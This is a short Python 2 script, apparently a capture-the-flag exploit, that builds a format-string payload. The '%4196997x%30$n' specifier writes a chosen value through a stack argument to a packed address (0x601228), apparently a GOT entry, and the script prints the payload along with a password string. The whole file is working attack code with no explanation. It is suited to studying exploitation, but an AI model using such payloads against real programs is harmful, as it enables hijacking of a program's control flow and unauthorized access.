import struct

def pack(addr):
    return struct.pack("<Q", addr);

fmt = "%4196997x%30$n  ";
got = pack(0x0000000000601228);
passwd = "something"

print fmt + got
print passwd

